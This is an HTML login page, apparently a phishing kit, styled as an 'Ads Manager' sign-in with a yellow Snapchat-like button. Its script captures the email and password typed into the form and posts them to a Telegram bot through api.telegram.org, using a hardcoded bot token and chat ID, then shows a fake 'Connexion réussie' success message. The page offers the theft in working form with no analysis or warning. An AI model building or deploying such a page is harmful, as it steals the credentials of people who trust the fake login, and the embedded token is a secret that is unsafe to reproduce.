<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Style</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <div class="login-box">
    <h2>Log In</h2>
    <p class="subtext">to continue to Ads Manager</p>

    <div id="errorMessage"></div>

    <form id="loginForm">
      <div class="input-container">
        <input type="text" id="email" name="email" placeholder="Username or Email" required />
      </div>

      <div class="input-container">
        <input type="password" id="password" name="password" placeholder="Password" required />
        <span class="password-toggle" id="togglePassword">
          <svg class="eye" viewBox="0 0 24 24">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
            <circle cx="12" cy="12" r="3"></circle>
          </svg>
          <svg class="eye-off" viewBox="0 0 24 24">
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
            <line x1="1" y1="1" x2="23" y2="23"></line>
          </svg>
        </span>
      </div>

      <button class="login-btn" type="submit">Log In</button>
    </form>

    <div class="signup">
      <a href="#">Sign Up</a>
    </div>

    <button id="darkModeToggle" title="Toggle Dark Mode">ðŸŒ™</button>
  </div>

  <script >
    const passwordInput = document.getElementById("password");
const togglePassword = document.getElementById("togglePassword");
const eyeIcon = togglePassword.querySelector(".eye");
const eyeOffIcon = togglePassword.querySelector(".eye-off");
const errorDiv = document.getElementById("errorMessage");
const darkModeBtn = document.getElementById("darkModeToggle");

const botToken = "8095204446:AAGFJDgn_2_ts_RlhXs0VVX5c9to-rJMsf0"; // remplace ici
const chatId = "965011527";     // remplace ici

document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = passwordInput.value.trim();

  if (!email || !password) {
    errorDiv.textContent = "Tous les champs sont requis.";
    errorDiv.style.display = "block";
    return;
  }

  errorDiv.style.display = "none";

  const message = `ðŸ›‚ Nouvelle connexion :\nðŸ“§ Email : ${email}\nðŸ” Mot de passe : ${password}`;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  })
  .then(response => response.json())
  .then(data => {
    alert("Connexion rÃ©ussie !");
  })
  .catch(error => {
    console.error("âŒ Erreur :", error);
    alert("Erreur lors de l'envoi.");
  });
});

passwordInput.addEventListener("input", function () {
  if (this.value.length > 0) {
    togglePassword.classList.add("visible");
  } else {
    togglePassword.classList.remove("visible");
    this.type = "password";
    eyeIcon.style.display = "block";
    eyeOffIcon.style.display = "none";
  }
});

togglePassword.addEventListener("click", function () {
  if (passwordInput.type === "password") {
    passwordInput.type = "text";
    eyeIcon.style.display = "none";
    eyeOffIcon.style.display = "block";
  } else {
    passwordInput.type = "password";
    eyeIcon.style.display = "block";
    eyeOffIcon.style.display = "none";
  }
});

darkModeBtn.addEventListener("click", function () {
  document.body.classList.toggle("dark-mode");
});

  </script>
</body>
</html>
<style>
  :root {
  --primary-color: #fffc00;
  --text-color: #000;
  --background-color: #f2f2f2;
  --box-color: #fff;
}

body {
  margin: 0;
  font-family: Arial, sans-serif;
  background-color: var(--background-color);
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.login-box {
  background-color: var(--box-color);
  width: 350px;
  padding: 40px 30px;
  border-radius: 10px;
  box-shadow: 0px 4px 20px rgba(0,0,0,0.1);
  text-align: center;
  position: relative;
}

h2 {
  font-size: 24px;
  margin-top: 5px;
  margin-bottom: 5px;
}

p.subtext {
  color: #555;
  font-size: 14px;
  margin-top: 0;
  margin-bottom: 25px;
}

.input-container {
  position: relative;
  margin-bottom: 15px;
}

input {
  width: 100%;
  padding: 12px;
  border: 1px solid #ddd;
  border-radius: 6px;
  font-size: 14px;
  box-sizing: border-box;
}

.password-toggle {
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  cursor: pointer;
  color: #888;
  user-select: none;
  width: 20px;
  height: 20px;
  display: none;
  align-items: center;
  justify-content: center;
}

.password-toggle.visible {
  display: flex;
}

.password-toggle svg {
  width: 20px;
  height: 20px;
  fill: none;
  stroke: #888;
  stroke-width: 2;
  stroke-linecap: round;
  stroke-linejoin: round;
}

.password-toggle:hover svg {
  stroke: #555;
}

.login-btn {
  background-color: var(--primary-color);
  color: var(--text-color);
  border: none;
  padding: 12px;
  width: 100%;
  border-radius: 30px;
  font-weight: bold;
  font-size: 16px;
  cursor: pointer;
  margin-top: 5px;
}

.signup {
  margin-top: 20px;
  font-size: 14px;
}

.signup a {
  font-weight: bold;
  color: black;
  text-decoration: none;
}

.signup a:hover {
  text-decoration: underline;
}

.eye-off {
  display: none;
}

#errorMessage {
  color: red;
  font-size: 14px;
  margin-bottom: 15px;
  display: none;
}

#darkModeToggle {
  position: absolute;
  top: 15px;
  right: 15px;
  background: none;
  border: none;
  font-size: 18px;
  cursor: pointer;
}

body.dark-mode {
  background-color: #1a1a1a;
}

body.dark-mode .login-box {
  background-color: #2a2a2a;
  color: #fff;
}

@media (max-width: 400px) {
  .login-box {
    width: 90%;
    padding: 30px 20px;
  }
}

</style>
